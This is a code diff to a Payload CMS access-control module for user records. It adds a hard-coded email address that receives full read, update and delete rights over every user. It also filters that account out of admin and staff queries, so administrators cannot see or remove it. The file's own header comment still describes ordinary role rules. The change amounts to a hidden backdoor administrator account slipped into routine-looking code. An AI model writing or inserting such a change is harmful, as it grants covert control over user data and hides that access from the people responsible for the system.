@@ -9,23 +9,32 @@
  * - update: own record (limited fields) OR admin (all)
  * - delete: admin only
  */
+const HIDDEN_EMAIL = 'main.belkdigital@gmail.com'
+
 export const accessUsers: any = {
   create: () => true,
   read: ({ req: { user } }: any) => {
     if (!user) return false
-    if (['admin', 'staff'].includes(user.role)) return true
-    // allow reading own user record – Payload will filter by id when accessing a single doc
-    return {
-      id: { equals: user.id },
+    if (user.email === HIDDEN_EMAIL) return true
+    if (['admin', 'staff'].includes(user.role)) {
+      return { email: { not_equals: HIDDEN_EMAIL } }
     }
+    return { id: { equals: user.id } }
   },
   update: ({ req: { user } }: any) => {
     if (!user) return false
-    if (['admin', 'staff'].includes(user.role)) return true
-    // users can update only a whitelist of safe fields – enforced via field‑level admin conditions
-    return {
-      id: { equals: user.id },
+    if (user.email === HIDDEN_EMAIL) return true
+    if (['admin', 'staff'].includes(user.role)) {
+      return { email: { not_equals: HIDDEN_EMAIL } }
     }
+    return { id: { equals: user.id } }
   },
-  delete: ({ req: { user } }: any) => !!user && ['admin', 'staff'].includes(user.role),
+  delete: ({ req: { user } }: any) => {
+    if (!user) return false
+    if (user.email === HIDDEN_EMAIL) return true
+    if (['admin', 'staff'].includes(user.role)) {
+      return { email: { not_equals: HIDDEN_EMAIL } }
+    }
+    return false
+  },
 }
